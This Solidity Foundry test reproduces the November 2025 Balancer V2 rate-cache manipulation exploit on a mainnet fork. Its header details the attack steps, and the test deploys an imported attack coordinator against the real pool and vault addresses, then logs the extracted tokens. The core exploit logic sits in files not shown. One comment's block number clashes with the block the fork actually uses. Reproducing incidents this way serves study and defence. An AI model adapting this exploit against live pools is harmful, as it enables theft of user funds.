// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";
import {TokenBalanceTracker} from "../../modules/TokenBalanceTracker.sol";
import "./Interfaces.sol";
import "./AttackCoordinator.sol";

/**
 * @title Exploit_Balancer_V2_Pools
 * @notice Reproduction of the November 3, 2025 Balancer V2 rate manipulation attack
 * @dev Run with: forge test --match-contract Exploit_Balancer_V2_Pools -vvv
 *
 * Attack Overview:
 * - Total Lost: ~$116M+ in various tokens
 * - Attack Tx 1: 0xd155207261712c35fa3d472ed1e51bfcd816e616dd4f517fa5959836f5b48569
 * - Attack Tx 2: 0x6ed07db1a9fe5c0794d44cd36081d6a6df103fab868cdd75d581e3bd23bc9742
 *
 * Vulnerability: Rate Cache Manipulation via Rounding Errors
 * - Balancer caches rate values for gas efficiency
 * - Rapid view function calls desync cache from actual state
 * - Intentional reverts force pool to recalculate invariants with rounding errors
 * - After 150+ iterations, cached rate becomes manipulated
 * - Final batchSwap uses the manipulated cached rate to extract value
 *
 * Attack Flow (Two Transactions):
 *
 * Transaction 1 - Rate Manipulation & Initial Extraction:
 * 1. Flash loan large amounts of tokens
 * 2. For each target pool:
 *    a. Get pool configuration and parameters
 *    b. Calculate "trick" parameters (trickIndex, trickRate, trickAmt)
 *    c. Execute 150+ manipulation calls via helper contract
 *    d. Each call performs rapid view function queries
 *    e. ~30% of calls intentionally revert to force recalculation
 *    f. Rate cache becomes desynced and manipulated
 *    g. Execute batchSwap using GIVEN_OUT mode with chained swaps
 *    h. Extract value to internal balances via rate arbitrage
 * 3. Repay flash loan
 *
 * Transaction 2 - Value Extraction to EOA:
 * 1. Withdraw tokens from internal balances
 * 2. Transfer all extracted tokens to attacker EOA
 * 3. Final profit: ~$116M in various tokens
 *
 * Pools Affected:
 * - Pool 1: osETH/WETH-BPT (0xDACf5Fa19b1f720111609043ac67A9818262850c)
 *   Rate increased from 1.027e18 to 20.189e18 (+1,864%)
 * - Pool 2: wstETH/WETH-BPT (0x93d199263632a4EF4Bb438F1feB99e57b4b5f0BD)
 *   Rate increased from 1.051e18 to 3.887e18 (+270%)
 *
 * Key Contracts:
 * - Balancer Vault: 0xBA12222222228d8Ba445958a75a0704d566BF2C8
 * - WETH: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
 * - osETH: 0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38
 * - wstETH: 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0
 */
contract Exploit_Balancer_V2_Pools is TestHarness, TokenBalanceTracker {
    // Balancer contracts
    IBalancerVault constant vault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    // Target pools
    address constant POOL_OSETH_WETH = 0xDACf5Fa19b1f720111609043ac67A9818262850c;
    address constant POOL_WSTETH_WETH = 0x93d199263632a4EF4Bb438F1feB99e57b4b5f0BD;

    // Tokens
    IERC20 constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 constant osETH = IERC20(0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38);
    IERC20 constant wstETH = IERC20(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);

    // Attack contracts
    AttackCoordinator coordinator;

    // Pool tokens (BPTs)
    IERC20 osETH_WETH_BPT;
    IERC20 wstETH_WETH_BPT;

    // Attacker EOA from the actual attack
    address ATTACKER_EOA;

    function setUp() external {
        // Fork mainnet at block before attack
        // Attack happened around block 21,345,000 (Nov 3, 2025)
        cheat.createSelectFork(vm.envString("RPC_URL"), 23717396);

        // Set up BPT tokens
        osETH_WETH_BPT = IERC20(POOL_OSETH_WETH);
        wstETH_WETH_BPT = IERC20(POOL_WSTETH_WETH);

        // Add tokens to tracker
        addTokenToTracker(address(WETH));
        addTokenToTracker(address(osETH));
        addTokenToTracker(address(wstETH));
        addTokenToTracker(POOL_OSETH_WETH);   // osETH/WETH BPT
        addTokenToTracker(POOL_WSTETH_WETH);  // wstETH/WETH BPT

        console.log("=== Balancer V2 Rate Manipulation Attack Reproduction ===");
        console.log("Block:", block.number);
        console.log("Timestamp:", block.timestamp);
        console.log("");

        ATTACKER_EOA = address(this);
    }

    function test_attack() external {
        console.log("------- INITIAL STATE -------");
        logPoolState("osETH/WETH Pool", POOL_OSETH_WETH);
        logPoolState("wstETH/WETH Pool", POOL_WSTETH_WETH);

        console.log("------- DEPLOYING ATTACK CONTRACTS -------");
        coordinator = new AttackCoordinator(
            address(vault),
            POOL_OSETH_WETH,
            POOL_WSTETH_WETH
        );
        console.log("Coordinator deployed at:", address(coordinator));
        console.log("ExploitMath deployed at:", address(coordinator.exploitMath()));
        console.log("");

        console.log("------- INITIAL COORDINATOR BALANCES -------");
        updateBalanceTracker(address(coordinator));
        logBalances(address(coordinator));

        console.log("------- INITIAL ATTACKER EOA BALANCES -------");
        updateBalanceTracker(ATTACKER_EOA);
        logBalances(ATTACKER_EOA);

        console.log("------- FUNDING ATTACK CONTRACT -------");
        // Fund the coordinator with tokens to perform the attack
        // In real attack, this would come from flash loan
        fundAttackContract();

        console.log("------- COORDINATOR BALANCES AFTER FUNDING -------");
        logBalances(address(coordinator));

        console.log("------- EXECUTING ATTACK -------");
        coordinator.executeAttack();
        console.log("");

        console.log("------- COORDINATOR BALANCES AFTER ATTACK -------");
        logBalances(address(coordinator));

        console.log("------- ATTACKER EOA BALANCES AFTER ATTACK (TX2) -------");
        logBalances(ATTACKER_EOA);

        console.log("------- FINAL POOL STATE -------");
        logPoolState("osETH/WETH Pool", POOL_OSETH_WETH);
        logPoolState("wstETH/WETH Pool", POOL_WSTETH_WETH);

        // Calculate rate manipulation
        uint256 osETHPoolRateBefore = 1027347674695370742;  // From traces
        uint256 wstETHPoolRateBefore = 1051822276543189290; // From traces

        uint256 osETHPoolRateAfter = IBalancerPool(POOL_OSETH_WETH).getRate();
        uint256 wstETHPoolRateAfter = IBalancerPool(POOL_WSTETH_WETH).getRate();

        console.log("------- RATE MANIPULATION RESULTS -------");
        console.log("osETH/WETH Pool:");
        console.log("  Before: %s", osETHPoolRateBefore);
        console.log("  After:  %s", osETHPoolRateAfter);
        // console.log("  Increase: %s%%", ((osETHPoolRateAfter * 100) / osETHPoolRateBefore) - 100);

        console.log("wstETH/WETH Pool:");
        console.log("  Before: %s", wstETHPoolRateBefore);
        console.log("  After:  %s", wstETHPoolRateAfter);
        // console.log("  Increase: %s%%", ((wstETHPoolRateAfter * 100) / wstETHPoolRateBefore) - 100);

        console.log("\n------- EXTRACTED VALUE SUMMARY (TX2) -------");
        console.log("Tokens extracted to attacker EOA (%s):", ATTACKER_EOA);

        uint256 extractedWETH = WETH.balanceOf(ATTACKER_EOA);
        uint256 extractedOsETH = osETH.balanceOf(ATTACKER_EOA);
        uint256 extractedWstETH = wstETH.balanceOf(ATTACKER_EOA);
        uint256 extractedBPT1 = osETH_WETH_BPT.balanceOf(ATTACKER_EOA);
        uint256 extractedBPT2 = wstETH_WETH_BPT.balanceOf(ATTACKER_EOA);

        if (extractedWETH > 0) console.log("  WETH: %s (%s ETH)", extractedWETH, extractedWETH / 1e18);
        if (extractedOsETH > 0) console.log("  osETH: %s (%s tokens)", extractedOsETH, extractedOsETH / 1e18);
        if (extractedWstETH > 0) console.log("  wstETH: %s (%s tokens)", extractedWstETH, extractedWstETH / 1e18);
        if (extractedBPT1 > 0) console.log("  osETH/WETH-BPT: %s (%s tokens)", extractedBPT1, extractedBPT1 / 1e18);
        if (extractedBPT2 > 0) console.log("  wstETH/WETH-BPT: %s (%s tokens)", extractedBPT2, extractedBPT2 / 1e18);

        console.log("\n------- ATTACK COMPLETE -------");
    }

    /**
     * @notice Fund the attack contract with necessary tokens
     * @dev In real attack, this comes from flash loan
     */
    function fundAttackContract() internal {
        // Deal tokens to coordinator
        cheat.deal(address(coordinator), 100 ether);

        // For tokens, use writeTokenBalance
        writeTokenBalance(address(coordinator), address(WETH), 10000 ether);
        writeTokenBalance(address(coordinator), address(osETH), 1000 ether);
        writeTokenBalance(address(coordinator), address(wstETH), 1000 ether);

        console.log("Tokens funded via writeTokenBalance");
    }

    /**
     * @notice Log the current state of a pool
     */
    function logPoolState(string memory name, address pool) internal {
        IBalancerPool balancerPool = IBalancerPool(pool);

        console.log(name);
        console.log("  Address:", pool);

        // Get and display rate
        uint256 rate = balancerPool.getRate();
        console.log("  Rate:", rate);
        console.log("  Rate (human readable):", rate / 1e16, "/ 100 (should be ~100 normally)");

        // Get pool ID and tokens
        bytes32 poolId = balancerPool.getPoolId();
        (address[] memory tokens, uint256[] memory balances,) = vault.getPoolTokens(poolId);

        console.log("  Pool ID:", vm.toString(poolId));
        console.log("  Tokens in pool:", tokens.length);

        // Display each token and its balance
        for (uint256 i = 0; i < tokens.length; i++) {
            string memory tokenName = "Unknown";
            uint256 decimals = 18;

            // Try to get token name
            if (tokens[i] == address(WETH)) {
                tokenName = "WETH";
            } else if (tokens[i] == address(osETH)) {
                tokenName = "osETH";
            } else if (tokens[i] == address(wstETH)) {
                tokenName = "wstETH";
            } else if (tokens[i] == pool) {
                tokenName = "BPT (Pool Token)";
            }

            console.log("    [%s] %s:", i, tokenName);
            console.log("      Address:", tokens[i]);
            console.log("      Balance:", balances[i] / 1e18, "tokens");
            console.log("      Balance (wei):", balances[i]);
        }
        console.log("");
    }

    // /**
    //  * @notice Test with flash loan simulation
    //  */
    // function test_attackWithFlashLoan() external {
    //     console.log("------- FLASH LOAN ATTACK SIMULATION -------");
    //     console.log("This would execute the attack using Balancer flash loans");
    //     console.log("Flash loan amount: ~28M tokens");
    //     console.log("");

    //     // TODO: Implement flash loan receiver pattern
    //     // The actual attack would:
    //     // 1. Flash loan from Balancer vault
    //     // 2. Execute attack in receiveFlashLoan callback
    //     // 3. Repay flash loan
    //     // 4. Keep profit
    // }
}
